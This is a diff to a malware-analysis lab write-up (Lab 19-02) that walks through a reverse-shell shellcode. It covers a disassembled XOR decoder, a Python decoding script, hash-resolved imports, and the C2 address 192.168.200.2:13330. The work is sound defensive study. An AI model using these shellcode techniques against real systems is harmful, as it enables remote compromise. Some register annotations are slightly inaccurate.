@@ -16,7 +16,7 @@ seg000:00000000                 inc     ecx
 seg000:000001FE                 inc     ecx
 seg000:000001FF                 inc     ecx
 seg000:00000200                 xor     ecx, ecx
-seg000:00000202                 mov     cx, 18Dh			-> ECX = 8Dh
+seg000:00000202                 mov     cx, 18Dh			-> ECX = 18Dh
 seg000:00000206                 jmp     short loc_21F
 seg000:00000208
 seg000:00000208 ; =============== S U B R O U T I N E =======================================
@@ -50,7 +50,7 @@ seg000:00000224                 dec     ecx
 
 As we can see, first we have a block of _0x200_ bytes of _inc ecx_ instructions, something that is useless since at _0x00000200_ the binary executes a _xor ecx, ecx_ instruction. So we can conclude that this block of code is just a _NOP sled_ but without using the _0x90_ opcode.
 
-Then, the binary adds the value _0x8D_ to _ECX_ and jumps to the instruction located at _0x0000021F_, which will call to the function at _0x00000208_.
+Then, the binary adds the value _0x18D_ to _ECX_ and jumps to the instruction located at _0x0000021F_, which will call to the function at _0x00000208_.
 
 ![_IDA Pro_ main function](../Pictures/Lab_19/lab_19-01_1_ida_pro_1.png)
 
@@ -168,7 +168,7 @@ seg000:0000007D                 mov     eax, fs:[eax+30h]		-> PEB
 seg000:00000081                 test    eax, eax
 seg000:00000083                 js      short loc_94
 seg000:00000085                 mov     eax, [eax+0Ch]			-> EAX = PEB_LDR
-seg000:00000088                 mov     esi, [eax+1Ch]			ESI = InInitializationOrderModuleList (pointer to LDR_DATA_TABLE_ENTRY[0x10])
+seg000:00000088                 mov     esi, [eax+1Ch]			-> ESI = InInitializationOrderModuleList (pointer to LDR_DATA_TABLE_ENTRY[0x10])
 seg000:0000008B                 lodsd					-> EAX = ESI = LDR_DATA_TABLE_ENTRY[0x10] 
 seg000:0000008C                 mov     eax, [eax+8]			-> EAX = LDR_DATA_TABLE_ENTRY[0x10 + 0x8] = DllBase
 seg000:0000008F                 jmp     loc_99
@@ -348,10 +348,10 @@ lstrlenW
 
 The complete list is composed by 953 exports!
 
-So now, we execute our script using this wordlist as follows:
+So now, we execute our script using this wordlist as follows (some changes may have to be done, since this script is also used in other exercises):
 
 ```
-$ python3 Scripts/Labs/Lab_19/lab19_01_hashing_function.py Scripts/Labs/Lab_19/kernel32_exports.txt
+$ python3 Scripts/Labs/Lab_19/lab19_hashing_function.py Scripts/Labs/Lab_19/kernel32_exports.txt
 
 Occurrence found! The decrypted hash 0xec0e4e8e is: LoadLibraryA
 Occurrence found! The decrypted hash 0xb8e579c1 is: GetSystemDirectoryA
@@ -389,10 +389,10 @@ WriteHitLogging
 ZonesReInit
 ```
 
-In this case, the library has a total of 86 functions, let's see if now we get the last import:
+In this case, the library has a total of 86 functions, let's see if now we get the last import (some changes may have to be done, since this script is also used in other exercises):
 
 ```
-$ python3 Scripts/Labs/Lab_19/lab19_01_hashing_function.py Scripts/Labs/Lab_19/urlmon_exports.txt
+$ python3 Scripts/Labs/Lab_19/lab19_hashing_function.py Scripts/Labs/Lab_19/urlmon_exports.txt
 
 No occurrence found for hash 0xec0e4e8e!
 No occurrence found for hash 0xb8e579c1!
@@ -583,12 +583,292 @@ Great! We can now load it in _IDA Pro_ and see what it does.
 
 ![_IDA Pro_ shellcode 1](../Pictures/Lab_19/lab_19-02_3_ida_pro_1.png)
 
+The first executed instruction is:
+
+```
+seg000:00000000                 jmp     short loc_13
+```
+
+This will jump to a call instruction at _0x13_:
+
+```
+seg000:00000013 loc_13:                                 ; CODE XREF: seg000:00000000↑j
+seg000:00000013                 call    loc_2
+```
+
+This call instruction executes the function at _0x02_:
+
+```
+seg000:00000002 loc_2:                                  ; CODE XREF: seg000:loc_13↓p
+seg000:00000002                 pop     edi				-> Pointer to return address: 0x18
+seg000:00000003                 push    small 18Fh
+seg000:00000007                 pop     cx				-> CX = 0x18F -> EXC = 0x18F = 399
+seg000:00000009                 mov     al, 0E7h		-> AL = 0xE7
+seg000:0000000B
+seg000:0000000B loc_B:                                  ; CODE XREF: seg000:0000000E↓j
+seg000:0000000B                 xor     [edi], al		-> EDI[counter] = EDI[counter] ^ AL
+seg000:0000000D                 inc     edi				-> counter = counter + 1
+seg000:0000000E                 loopw   loc_B			-> ECX = ECX + 1 | jump to 0xB
+seg000:00000011                 jmp     short loc_18	-> Jump to decoded code
+```
+
+As we can see, it's a loop that iterates 399 (_0x18F_) times over the code after the call instruction applying a XOR operation with _0xE7_ as key.
+
+We reproduce this behaviour in the following python script:
+
+```
+MAX_VALUE = 0xFF
+
+def decrypt_file():
+	decoded_bytes = bytearray()
+	key = 0xE7
+	counter = 0x18F
+
+	with open("Scripts/Labs/Lab_19/lab19-02.bin", "rb") as encoded_file:
+		encoded_file.seek(0x18)
+		encoded_byte = int.from_bytes(encoded_file.read(1), byteorder="big")
+
+		while counter > 0:
+			decoded_byte = (encoded_byte ^ key) & MAX_VALUE
+			decoded_bytes.append(decoded_byte)
+
+			counter = counter - 1
+			encoded_byte = int.from_bytes(encoded_file.read(1), byteorder="big")
+
+	return decoded_bytes
+
+def save_decrypted_file(decoded_bytes):
+	decoded_file = open("Scripts/Labs/Lab_19/lab19-02_stage_2.bin", "wb")
+	decoded_file.write(decoded_bytes)
+
+decoded_bytes = decrypt_file()
+save_decrypted_file(decoded_bytes)
+```
+
+To execute it, we just:
+
+```
+$ python3 Scripts/Labs/Lab_19/lab19_02_decode_next_stage.py
+```
+
+Now, we can open it with IDA Pro as any regular binary file.
+
+![_IDA Pro_ shellcode stage 2](../Pictures/Lab_19/lab_19-02_3_ida_pro_2.png)
 
 **4. Which functions does the shellcode manually import?**
 
+We have to analyze what the shellcode does first, before importing any function.
+
+First, it will jump to a call instruction at _0x16E_:
+
+```
+seg000:00000008                 jmp     loc_16E
+...
+seg000:0000016E                 call    loc_9B
+```
+
+This call instruction will execute the following piece of code at _0x9B_:
+
+```
+seg000:0000009B                 pop     esi			-> Pointer to return address at 0x173
+seg000:0000009C                 mov     ebx, esi	-> EBX = pointer to return address at 0x173
+seg000:0000009E                 mov     edi, esi	-> EDI = pointer to return address at 0x173
+seg000:000000A0                 call    sub_7A
+```
+
+As we can see, a pointer to return address (_0x173_) of the call instruction is stored in _ESI_, also this value is stored in _EBX_ and _EDI_. Then, it will call a function at _0x7A_.
+
+![_IDA Pro_ _kernel32.dll_ _DllBase_](../Pictures/Lab_19/lab_19-02_4_ida_pro_1.png)
+
+As we can see, is the same routine of the previous shellcode to get the _kernel32.dll_ _DllBase_ address.
+
+When the function returns, it will store the result into _EDX_, aside from _EAX_, and store the value 4 in _ECX_.
+
+```
+seg000:000000A5                 mov     edx, eax
+seg000:000000A7                 mov     ecx, 4
+```
+
+Then, it will loop as follows 4 times (value of _ECX_).
+
+```
+seg000:000000AC loc_AC:                                 ; CODE XREF: seg000:000000B5↓j
+seg000:000000AC                 lodsd
+seg000:000000AD                 push    eax             ; EAX = value of address at 0x173
+seg000:000000AE                 push    edx             ; kernel32 DllBase
+seg000:000000AF                 call    sub_2E
+seg000:000000B4                 stosd
+seg000:000000B5                 loop    loc_AC
+```
+
+It will load the value stored at _0x173_ (the value of _ESI_) and then call the function at _0x2E_.
+
+![_IDA Pro_ _kernel32.dll_ _DllBase_](../Pictures/Lab_19/lab_19-02_4_ida_pro_2.png)
+
+As we can see, is the same function that will loop over the _IMAGE_EXPORT_DIRECTORY_ struct of _kernel32.dll_ to get the address of the needed functions. Also, the function _sub_D_ 
+
+![_IDA Pro_ hashing function](../Pictures/Lab_19/lab_19-02_4_ida_pro_3.png)
+
+As we can see, is the same hashing function used in the previous exercise.
+
+So now, we can use the same script of the exercise 1 to get the imported functions, but first, we need to get the hashes at _0x173_:
+
+```
+seg000:00000173                 db 8Eh
+seg000:00000174                 db  4Eh ; N
+seg000:00000175                 db  0Eh
+seg000:00000176                 db 0ECh
+seg000:00000177                 db  72h ; r
+seg000:00000178                 db 0FEh
+seg000:00000179                 db 0B3h
+seg000:0000017A                 db  16h
+seg000:0000017B                 db  83h
+seg000:0000017C                 db 0B9h
+seg000:0000017D                 db 0B5h
+seg000:0000017E                 db  78h ; x
+seg000:0000017F                 db 0E6h
+seg000:00000180                 db  17h
+seg000:00000181                 db  8Fh
+seg000:00000182                 db  7Bh
+```
+
+We have selected the 16 bytes that composes the 4 hashes (4 bytes each element). So the hashes are (click 'D' key 2 times):
+
+```
+seg000:00000173                 dd 0EC0E4E8Eh
+seg000:00000177                 dd 16B3FE72h
+seg000:0000017B                 dd 78B5B983h
+seg000:0000017F                 dd 7B8F17E6h
+```
+
+We use the wordlist of _kernel32.dll_ exported functions in the script and (some changes may have to be done, since this script is also used in other exercises)...
+
+```
+$ python3 Scripts/Labs/Lab_19/lab19_hashing_function.py Scripts/Labs/Lab_19/kernel32_exports.txt
+
+Occurrence found! The decrypted hash 0xec0e4e8e is: LoadLibraryA
+Occurrence found! The decrypted hash 0x16b3fe72 is: CreateProcessA
+Occurrence found! The decrypted hash 0x78b5b983 is: TerminateProcess
+Occurrence found! The decrypted hash 0x7b8f17e6 is: GetCurrentProcess
+```
+
+Great! But... We have to check if this hashing function is used again, to see if the sample imports some other functions.
+
+So after executing the function _sub_2E_, the shellcode will execute the following instruction:
+
+```
+seg000:000000B4                 stosd
+```
+
+This will store the value at _EAX_ (the address of the imported function) to the address pointed by registry _EDI_ and, if we remember, _EDI_ will point to the same loacation of _ESI_ and _EBX_, the address at _0x173_.
+
+So now, the next instructions the sample will execute are:
+
+```
+seg000:000000B7                 push    3233h           ; '23'
+seg000:000000BC                 push    5F327377h       ; '_2sw'
+seg000:000000C1                 push    esp
+seg000:000000C2                 call    dword ptr [ebx] ; LoadLibraryA
+seg000:000000C4                 mov     edx, eax
+seg000:000000C6                 mov     ecx, 3
+seg000:000000CB
+seg000:000000CB loc_CB:                                 ; CODE XREF: seg000:000000D4↓j
+seg000:000000CB                 lodsd
+seg000:000000CC                 push    eax
+seg000:000000CD                 push    edx
+seg000:000000CE                 call    sub_2E			; look for funtions
+seg000:000000D3                 stosd
+seg000:000000D4                 loop    loc_CB
+```
+
+As we can see, it will use _LoadLibraryA_ to load the library _ws2_32_ (take in mind little endian). Then it will loop 3 times over its _IMAGE_EXPORT_DIRECTORY_ struct using the hashes stored after the ones located at _0x173_ to get the expected functions. The hashes that will use are:
+
+```
+seg000:00000183                 dd 3BFCEDCBh
+seg000:00000187                 dd 0ADF509D9h
+seg000:0000018B                 dd 60AAF9ECh
+```
+
+We get the exported functions of such library _ws2_32_, we introduce the hashes into the script and then we execute it (some changes may have to be done, since this script is also used in other exercises):
+
+```
+$ python3 Scripts/Labs/Lab_19/lab19_hashing_function.py Scripts/Labs/Lab_19/ws2_32_exports.txt 
+
+Occurrence found! The decrypted hash 0x3bfcedcb is: WSAStartup
+Occurrence found! The decrypted hash 0xadf509d9 is: WSASocketA
+Occurrence found! The decrypted hash 0x60aaf9ec is: connect
+```
+
+Then, as seen before, the result will be stored as the previous functions.
+
+So now, we can fully analyze the rest of the shellcode.
+
 **5. What network hosts does the shellcode communicate with?**
 
+We need to analyze the main code of the shellcode to understand this.
+
+![_IDA Pro_ main code](../Pictures/Lab_19/lab_19-02_5_ida_pro_1.png)
+
+As we can see, the shellcode will use the well known _WSAStartup_, _WSASocketA_ and _connect_ to connect to a remote host, but which host exactly?
+
+We have to analyze the _connect_ call to find it:
+
+```
+seg000:00000104                 push    2C8A8C0h
+seg000:00000109                 push    12340002h
+seg000:0000010E                 mov     ecx, esp
+seg000:00000110                 push    10h
+seg000:00000115                 push    ecx
+seg000:00000116                 push    eax
+seg000:00000117                 call    dword ptr [ebx+18h] ; connect
+```
+
+As we can see, it uses a _sockaddr_ struct to pass the host information. This struct is composed by:
+
+```
+struct sockaddr_in {
+        short   sin_family;			-> 2 bytes
+        u_short sin_port;			-> 2 bytes
+        struct  in_addr sin_addr;
+        char    sin_zero[8];
+};
+```
+
+The struct value of the shellcode is:
+
+```
+2C8A8C012340002
+```
+
+This can be decomposed as follows (take in mind endianness):
+
+```
+0002	-> AF_INET
+3412	-> 13330
+C0		-> 192
+A8		-> 168
+C8		-> 200
+02		-> 2
+
+```
+
+So now, we have the port and the _IP_ address:
+
+```
+192.168.200.2:13330
+```
+
 **6. What does the shellcode do?**
+
+After connecting to the C&C, the shellcode will spawn a remote shell, but how?
+
+It will setup the _PROCESS_STARTUP_INFO_ struct to redirect the _stdInput_, _stdOutput_ and _stdError_ to the _socket_. Also, it is important to notice how the shellcode sets the argument _bInheritHandles_ to 1, indicating that file handles opened by the shellcode will be available to the child process
+
+![_IDA Pro_ main code](../Pictures/Lab_19/lab_19-02_6_ida_pro_1.png)
+
+Finally, the current process will terminate.
+
+![_IDA Pro_ terminate process](../Pictures/Lab_19/lab_19-02_6_ida_pro_2.png)
 
 ## Lab 19-3
 
